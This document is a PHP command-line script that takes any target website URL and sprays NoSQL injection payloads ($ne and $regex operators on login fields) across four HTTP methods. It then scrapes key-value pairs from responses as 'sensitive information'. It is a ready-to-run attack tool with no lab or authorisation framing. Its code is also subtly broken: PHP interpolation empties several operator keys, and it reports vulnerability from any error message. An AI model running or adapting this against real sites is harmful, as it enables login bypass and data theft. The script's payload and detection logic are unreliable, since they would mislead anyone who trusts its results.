<?php

// Function to make HTTP requests
function makeRequest($url, $method, $data = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    if ($data) {
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Function to test for NoSQL injection
function testNoSQLInjection($url) {
    $methods = array("GET", "POST", "PUT", "DELETE");
    $payloads = array(
        array("username" => "admin", "password" => ['$ne' => '']),
        array("username[$ne]" => "admin", "password" => "password"),
        array("username" => "admin", "password[$ne]" => "password"),
        array("username" => "admin", "password[$regex]" => ".*"),
        array("username" => "admin", "password[$regex]" => ".*", "email[$regex]" => ".*")
    );
    
    $vulnerable = false;
    $sensitiveData = array();

    foreach ($methods as $method) {
        foreach ($payloads as $payload) {
            $response = makeRequest($url, $method, http_build_query($payload));
            echo "\nTrying $method with payload: " . json_encode($payload) . "\n";
            echo "Response: \n$response\n";
            if (stripos($response, "error") !== false || stripos($response, "invalid") !== false) {
                echo "Target might be vulnerable to NoSQL Injection.\n";
                $vulnerable = true;
                // Extract sensitive information
                preg_match_all('/("[^"]*"[ \t\r\n]*:[ \t\r\n]*"[^"]*")/', $response, $matches);
                foreach ($matches[0] as $match) {
                    $sensitiveData[] = $match;
                }
                break 2;
            }
        }
    }

    if (!$vulnerable) {
        echo "Target does not appear to be vulnerable to NoSQL Injection.\n";
    } else {
        echo "Sensitive Information Found:\n";
        foreach ($sensitiveData as $data) {
            echo "$data\n";
        }
    }
}

// Main program
echo "\033[0;32mEnter your target website URL: \033[0m";
$targetUrl = trim(fgets(STDIN));
echo "\nTesting for NoSQL Injection vulnerability on $targetUrl...\n";
testNoSQLInjection($targetUrl);
